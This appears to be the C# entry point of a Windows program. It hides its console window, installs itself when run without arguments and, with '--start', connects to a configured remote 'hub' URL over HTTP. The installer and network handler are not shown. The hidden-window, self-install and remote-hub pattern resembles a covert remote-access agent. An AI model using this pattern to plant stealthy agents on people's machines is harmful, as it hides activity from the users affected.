using System.Runtime.InteropServices;

namespace stms;

public class Program
{
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
    private const int SW_HIDE = 0;

    static async Task Main(string[] args)
    {
        try
        {
            Logging.Log($"File path: {Config.file_path}");
            HideConsole();

            if (args.Length != 0)
            {
                string argument = args[0].ToLower();
                switch (argument)
                {
                    case "--start":
                        if (Config.hub_url != null)
                            await HttpHandler.Handle(Config.hub_url);
                        break;
                }
            }
            else
            {
                Installation.Install();
            }
        }
        catch (Exception e)
        {
            Logging.Log(e.ToString());
        }
    }

    static void HideConsole()
    {
        try
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }
        }
        catch
        {
            throw;
        }
    }
}